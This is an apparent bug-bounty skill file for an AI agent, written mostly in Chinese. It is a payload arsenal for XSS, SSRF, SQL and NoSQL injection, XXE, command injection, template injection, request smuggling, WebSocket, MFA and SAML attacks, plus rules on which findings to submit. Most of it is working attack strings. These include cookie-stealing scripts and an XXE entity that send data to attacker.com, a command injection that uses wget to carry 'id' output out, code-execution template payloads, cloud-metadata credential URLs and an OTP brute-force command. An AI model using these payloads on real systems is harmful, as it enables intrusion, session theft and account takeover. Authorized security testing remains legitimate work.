---
name: security-arsenal
description: 安全 payload、绕过表、字典、gf 模式名、一律拒绝的缺陷清单，以及需要攻击链才成立的条件表。当你需要 XSS/SSRF/SQLi/XXE/NoSQLi/命令注入/SSTI/IDOR/路径遍历/HTTP 请求走私/WebSocket/MFA 绕过的具体 payload、绕过技术，或需要判断某个发现是否可提交时使用。也适用于被问及哪些内容不应提交的场景。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [arsenal, tools, security, redteam]
  category: redteam
---

# 安全武器库

Payload、绕过表、字典与提交规则。

---

## When to Use

- 当你需要 XSS/SSRF/SQLi/XXE/NoSQLi/命令注入/SSTI/IDOR/路径遍历/HTTP 请求走私/WebSocket/MFA 绕过的具体 payload 与绕过技术。
- 用于判断某个发现是否可提交。

## Prerequisites

- 目标的明确授权、边界与速率限制。
- 工具：`curl`、`ffuf`、`gf`、`hashcat`、`interactsh-client`、`mysql`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 任何改变状态的步骤（写入、上传、凭据尝试），都要在执行命令前立即取得明确确认。

## How to Run

```bash
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

## Procedure

下列各阶段即为流程。保持每个探测有界（`--max-time`），把证据记录在 `OUTPUT_DIR` 之下，并在「坑」一节列出的停止条件处停止。

## XSS PAYLOAD

### 基础探测
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie 窃取（影响证明）
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP 绕过技术
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML reflection
// Vue v-html binding

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS 的 Source 与 Sink
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE)
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOAD

### 云元数据
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### 内部服务指纹识别
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP 绕过 payload
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL 注入 PAYLOAD

### 检测
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### 联合查询注入（确定列数）
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### 盲 SQLi（基于时间的确认）
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF 绕过
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOAD

### 经典文件读取
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### 经由 HTTP 的盲 OOB（DNS 确认）
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### 经由 DNS + 数据外带 的盲 OOB
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### 经由 DOCX/SVG/PDF 上传的 XXE
- SVG：`<image href="file:///etc/passwd" />`
- DOCX：在 `word/document.xml` 中放置带外部实体的恶意 XML

---

## 路径遍历 PAYLOAD

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / 认证绕过 PAYLOAD

### 水平越权
```text
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### 垂直越权
```text
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## 认证绕过 PAYLOAD

### JWT 攻击
```text
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth 攻击
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## NOSQL 注入 PAYLOAD（MongoDB）

### 操作符注入（JSON body）
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET 参数注入
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### 认证绕过一行命令
```bash
curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## 命令注入 PAYLOAD

### 基础检测
```text
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### 盲 OOB（带外确认）
```text
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### 绕过技术
```text
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
# Obfuscate with quotes
;c'a't /etc/passwd
;c"a"t /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### 特定上下文（文件名注入）
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---

## SSTI 检测 PAYLOAD（所有引擎）

### 通用探针（全部发送，观察哪些被求值）
```
{{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}         → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}         → 49 = Mako (Python) or Pebble (Java)
*{7*7}         → 49 = Spring Thymeleaf
{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
```

### 按引擎划分的 RCE payload

**Jinja2（Python/Flask/Django）：**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Twig（PHP/Symfony）：**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker（Java）：**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB（Ruby on Rails）：**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf：**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS（Node.js）：**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

### 测试位置
```
Name/bio/username fields, email subject templates, invoice/PDF generators,
URL path parameters reflected in page, error messages, search query reflections,
HTTP headers that appear in rendered responses, notification templates
```

---

## HTTP 请求走私 PAYLOAD

### CL.TE——前端使用 Content-Length，后端使用 Transfer-Encoding
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL——前端使用 Transfer-Encoding，后端使用 Content-Length
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE——双方都支持 Transfer-Encoding，混淆以禁用它其中的一层
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL——HTTP/2 前端配合 Content-Length 注入
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### 检测（Burp）
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### 影响链
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```

---

## WEBSOCKET PAYLOAD

### IDOR / 认证绕过
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### 跨站 WebSocket 劫持（CSWSH）
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### 测试 Origin 校验
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### 经由 WS 消息的注入
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
```

---

## MFA / 2FA 绕过 PAYLOAD

### 模式 1：OTP 暴力破解（无速率限制）
```bash
# Try all 6-digit OTPs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Rate limit bypass: rotate session tokens between requests
# Or use GraphQL batching to send 100 attempts per request
```

### 模式 2：OTP 复用（令牌未失效）
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out
4. Log in again
5. Submit same OTP "123456" (expired? still works?)
6. Try OTP from previous session at new login
```

### 模式 3：响应篡改
```
Step 1: Enter wrong OTP → intercept response in Burp
Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
Step 3: Forward modified response → sometimes app trusts it and proceeds
Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
```

### 模式 4：验证码可预测
```python
import requests, time

# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = generate_totp(secret, time.time() + t_offset)
    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
    if r.status_code == 200:
        print(f"VALID at offset {t_offset}s: {totp_value}")
        break
```

### 模式 5：备用码无速率限制
```bash
# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
# Try brute force on /api/verify-backup-code if no rate limit
```

### 模式 6：跳过 MFA 步骤（工作流绕过）
```bash
# After entering username/password, you get a session cookie
# Test: skip the /mfa/verify step entirely, go directly to /dashboard
# If cookie grants access before MFA = auth flow bypass

# Also: complete MFA in one session, reuse cookie in another browser
# Checks whether MFA completion is tied to the specific session
```

### 模式 7：MFA 校验竞态
```python
import asyncio, aiohttp

# Race 2 MFA verifications simultaneously
# If both succeed = parallel session ATO
async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return await r.json()

async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)

asyncio.run(race())
```

---

## SAML 攻击

### 攻击 1：XML 签名包装（XSW）
```xml
<!-- Original valid assertion: -->
<saml:Assertion ID="legit">
  <NameID>user@company.com</NameID>
  <ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>
</saml:Assertion>

<!-- XSW: Inject malicious assertion before/after the signed one. -->
<!-- Server validates signature on #legit but processes #evil instead. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>     <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">              <!-- Original stays valid -->
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### 攻击 2：NameID 中的注释注入
```xml
<!-- Original: user@company.com -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: admin@company.com -->
<!-- SAML validator sees "user@company.com" (before comment) -->
<!-- Application uses "admin@company.com" (after comment stripped) -->
```

### 攻击 3：签名剥离
```
1. Capture SAMLResponse (base64 decode from browser)
2. Remove or modify the <Signature> element entirely
3. Change NameID to admin@company.com
4. Re-encode and submit
5. If server doesn't validate signature presence = admin login
```

### 攻击 4：SAML 断言中的 XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response>
  <saml:Assertion>
    <NameID>&xxe;</NameID>
  </saml:Assertion>
</saml:Response>
```

### 工具
```bash
# SAMLRaider (Burp extension) — most automated XSW testing
# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider

# Manual: decode, modify, re-encode
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
# Edit saml.xml
cat saml.xml | base64 -w0  # Re-encode
```

---

## GF 模式名（tomnomnom/gf）

```bash
# Install: https://github.com/tomnomnom/gf
# Usage: cat urls.txt | gf PATTERN

gf xss          # XSS parameters
gf ssrf         # SSRF parameters
gf idor         # IDOR parameters
gf sqli         # SQL injection parameters
gf redirect     # Open redirect parameters
gf lfi          # Local file inclusion
gf rce          # Remote code execution parameters
gf ssti         # Template injection parameters
gf debug_logic  # Debug/logic parameters
gf secrets      # Secret/token patterns
gf upload-fields # File upload parameters
gf cors         # CORS-related parameters
```

---

## 一律拒绝——绝不提交

提交这些会毁掉你的有效率。N/A 会带来负面影响。不要提交。

```
Missing CSP / HSTS / X-Frame-Options / other security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone (no auth bypass, no IDOR)
Banner / version disclosure without a working CVE exploit
Clickjacking on non-sensitive pages (no sensitive action in PoC)
Tabnabbing
CSV injection (no actual code execution shown)
CORS wildcard (*) without credential exfil PoC
Logout CSRF
Self-XSS (only exploits own account)
Open redirect alone (no ATO chain, no OAuth code theft)
OAuth client_secret in mobile app (disclosed, expected)
SSRF with DNS callback only (no internal service access)
Host header injection alone (no password reset poisoning PoC)
Rate limit on non-critical forms (login page Cloudflare, search, contact)
Session not invalidated on logout
Concurrent sessions allowed
Internal IP address in error message
Mixed content (HTTP resources on HTTPS page)
SSL weak cipher suites
Missing HttpOnly / Secure cookie flags alone
Broken external links
Pre-account takeover (usually — requires very specific conditions)
Autocomplete on password fields
```

---

## 有条件成立——需要攻击链

只有在结合能证明真实影响的攻击链时才成立：

| 独立发现 | 所需攻击链 | 串联后的结果 |
|---|---|---|
| 开放重定向 | + 通过滥用 redirect_uri 窃取 OAuth code | ATO（严重） |
| 点击劫持 | + 敏感操作 + 可用的 PoC（不只是登录页） | 中危 |
| CORS 通配符 | + 带凭据请求外泄用户数据 | 高危 |
| CSRF | + 敏感操作（转账、修改邮箱） | 高危 |
| 速率限制绕过 | + OTP/token 暴力破解成功 | 中危/高危 |
| 仅 DNS 回调的 SSRF | + 访问内部服务 + 取回数据 | 中危 |
| Host 头注入 | + 密码重置邮件使用该头 | 高危 |
| 提示注入 | + 读取其他用户数据（IDOR）或外泄或 RCE | 高危 |
| S3 桶列举 | + JS 包中包含 API key/OAuth secret | 中危/高危 |
| Self-XSS | + 通过 CSRF 在受害者处触发 | 中危 |
| 子域接管 | + 该子域注册了 OAuth redirect_uri | 严重 |
| GraphQL introspection | + 认证绕过 mutation 或对 node() 的 IDOR | 高危 |

**规则：** 先构造攻击链，确认端到端可用，然后再上报。绝不只报 A 然后说「可与 B 串联」——去证明它。

---

## 字典（安装于 ~/wordlists/）

```
common.txt         # Common directories and files
params.txt         # Parameter names (id, user_id, file, etc.)
api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
dirs.txt           # Directory names
sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```

### 值得模糊测试的内置路径

```bash
# Sensitive files
/.env
/.git/config
/config.json
/credentials.json
/backup.sql
/dump.sql
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt

# Admin panels
/admin
/admin/login
/administrator
/wp-admin
/manager
/console
/dashboard
/panel

# API discovery
/api
/api/v1
/api/v2
/graphql
/graphiql
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1
/v2
```

---

## Pitfalls
- **不理解就套用 payload**——`<script>alert(1)</script>` 是被拦截最多的 payload。使用绕过手法前先理解其为何有效。
- **假设所有 payload 对所有目标都有效**——针对 React 的 XSS payload 与 Angular、PHP 或传统 HTML 的不同。要让 payload 匹配技术栈。
- **每项测试只用一个 payload**——不同 WAF/编码/上下文需要不同 payload。每类漏洞至少测试 5 个变体。
- **使用过时的 payload 列表**——WAF 规则会更新。上个月有效的绕过可能已被修补。要用 payload 测试当前目标。
- **payload 不带上下文标记**——始终使用唯一标记（8 个以上随机字符）确认 payload 确实被反射，而不是巧合。

---

## Verification
- 记录实际针对每个目标使用过的 payload 及其结果；仅凭目录本身不构成证据。
- 声称绕过 WAF 时，需要被绕过的请求确实到达源站行为，而不只是返回了不同的状态码。
- 原始请求与响应存放在 `${OUTPUT_DIR:-./output}` 之下。

---

## 相关技能与攻击链

- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`**——当猎手正在测试某个参数并需要 payload 时。工作流原语：本技能是那些 hunt-* 技能会调用的 payload 库；hunt-* 技能识别 sink，本技能提供语法。
- **`triage-validation`**——当需要判断某个发现是否值得上报时。工作流原语：两个技能中的「一律拒绝」与「有条件成立——需要攻击链」表格必须一致；`triage-validation` 执行 7 问关卡，本技能提供 Q7 所用的需要攻击链的映射。
- **`web2-recon`**——当 URL 集合已按 `gf` 模式分类时。工作流原语：侦察产出的 `gf xss/ssrf/sqli` 结果 → 在此查找对应的 payload 章节；`gf` 模式名可直接索引到本技能的 payload 章节。
- **`evidence-hygiene`**——当 payload 产生的输出值得截图时。工作流原语：在 payload 证明了影响（Cookie 窃取、数据外泄）之后，移交给 `evidence-hygiene` 做脱敏，然后再让截图成为证据。
- **`bb-methodology`**——当第 3 阶段（发现）按输入类型分流时。工作流原语：第 3 阶段的决策流（「ID 参数 → IDOR 检查清单」、「URL 输入 → SSRF 检查清单」）会指明应加载本武器库的哪一章节。

---

## 操作者备注

> 源自实战经验 + 针对 2026 年的补充，叠加在随仓库内置的基础之上。
> 来自真实授权项目的经验 + 第二阶段验证，覆盖
> 本仓库 31+ 技能域的实弹测试。上游 payload 库
> 覆盖的是「是什么」；这一层覆盖的是「何时奏效、何时不奏效」。

### Payload 时效性——2026 年已失效的部分

经典的 CL.TE / TE.CL HTTP 请求走私 payload 已不再对 Nginx ≥ 1.21、Caddy 2.x、Envoy ≥ 1.20 有效（已在第二阶段 2H 验证）。它们**仍然**对 HAProxy ≤ 2.4、较旧的 F5 BIG-IP、Citrix ADC、AWS ALB 特定配置以及 Apache Traffic Server 有效。先对前端做指纹识别——`curl -sI` → `Server:` 头 + `Via:` 链 + TLS JA3——再去花数小时测试那些已被解析器在门口拒掉的 payload。

XXE 经典 payload 也是同样情况——Python lxml ≥ 5.x 默认静默丢弃 SYSTEM 实体（第二阶段 2G 的发现）。这些 payload 仍对以下目标有效：Java SAX、启用 LIBXML_NOENT 的 PHP DOMDocument、仍接有 XmlResolver 的 .NET XmlDocument、较旧的 lxml（< 5.0）、启用 DTDLOAD 的 Ruby Nokogiri，以及一长串内嵌的 XML 处理器（SOAP 库、SAML 实现、Office 文档解析器）。payload 库仍会收录这些内容——操作者的判断在于目标使用的解析器是否仍处于易受影响的那一组。

截至 2026 年，其他「默认失效但并非处处失效」的 payload 还有：`<a href>` 中的 `javascript:` URL（Chrome 除非有明确的用户手势否则会拦截；在嵌入式 WebView、Electron、较旧 Edge 中仍有效）；用于顶层导航的 `data:text/html`（现代浏览器在导航上下文中会剥离）；`Location:` 中的 CRLF 注入（多数反向代理会规范化）。始终在真实的目标环境中测试，而不是在通用浏览器里。

### WAF 绕过的尝试顺序很重要

当同一个 WAF 存在多个绕过 payload 时，尝试顺序应为：

1. **编码技巧**——大小写变化（`SeLeCt`）、URL 编码一次、URL 编码两次、Unicode 转义（`<`）、HTML 实体（`&#x3c;`）、UTF-8 超长序列。
2. **解析器怪癖**——XML 命名空间、JSON 在关键字中间的 `\u` 转义、`Content-Type: application/json` 与 `application/x-www-form-urlencoded` 的解析器混淆、multipart boundary 技巧。
3. **协议层**——HTTP/2 与 HTTP/1.1（某些 WAF 只检查其中一种）、Host 头注入、`X-Original-URL`、`X-Forwarded-*` 走私。
4. **特定 WAF 规则的绕过**——Cloudflare、AWS WAF、Akamai、Imperva、F5 ASM 各有已知的签名盲区；加载对应厂商的 payload 小节。

多数项目在第二步就结束——现代 WAF 会在解析器怪癖这一类上出错，因为 WAF 与源站应用对「什么是有效请求」的判断不一致。

### 「没有 OOB 就等于没发生」关卡处处适用

每个盲原语（盲 SQLi、盲 XSS、盲 SSRF、盲 RCE、盲 XXE）都需要 OOB 确认。没有它，你无法区分这是 bug 还是解析器错误日志。第二阶段 2D 的加固实验环境证明，该关卡能剔除那些表面上与真实 bug 一模一样的误报——500 页面中带有 `you have an error in your SQL syntax` 文本的错误消息，完全可能是另一个请求的解析器日志；在提交前，先命中 Burp Collaborator 域（或 interactsh）并确认回调。

截至 2026 年 OOB 回调基础设施的排序：(1) Burp Collaborator（Pro 许可证；最干净），(2) interactsh-client（开源；水平相当），(3) DNSLog.cn（免费但会被第三方记录——在付费项目中绝不使用），(4) 自建的 catch-all DNS + HTTP 监听器（对长期项目最可靠）。

### 标记纪律

通用词会自然出现在目标内容中。搜索 `javascript` 命中「JavaScript Tutorial」并非反射——那只是关键词重合。要使用唯一的随机字符串：

```
m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
# now m is like "K7gXq2pNRm1z" — search for THIS in the response
curl --max-time 30 --connect-timeout 10 "https://target/search?q=${m}" | grep -c "$m"
```

如果标记出现在响应中，说明存在反射。如果它以未转义的形式出现在 HTML 上下文中，说明存在 XSS 可能性。如果它出现在 Location 头中，说明是重定向。如果它出现在 SQL 错误中，说明是注入。标记是唯一的真相来源——通用关键词会说谎。

### 针对噪声 oracle 的统计采样

单次试验的时序差异只是噪声。要求 n≥10 次交错试验、Welch t 统计量 > 3，或等价的置信区间分离。第二阶段 2D 在一个刻意制造噪声的时序 oracle 上验证了这一点：单次试验显示 129ms 的差值（本会被提交）；n=10 时显示均值 78ms 对 191ms，t=5.26（真实且证据充分）。

时序侧信道验证的骨架：

```python
import statistics
def welch_t(a, b):
    ma, mb = statistics.mean(a), statistics.mean(b)
    va, vb = statistics.variance(a), statistics.variance(b)
    return (ma - mb) / ((va/len(a) + vb/len(b)) ** 0.5)
# interleave control + test trials, n=10 each, t > 3 = signal
```

同样的规则适用于盲布尔 oracle——当差异体现为抖动下的响应长度或状态码时，要采样，不要假设。
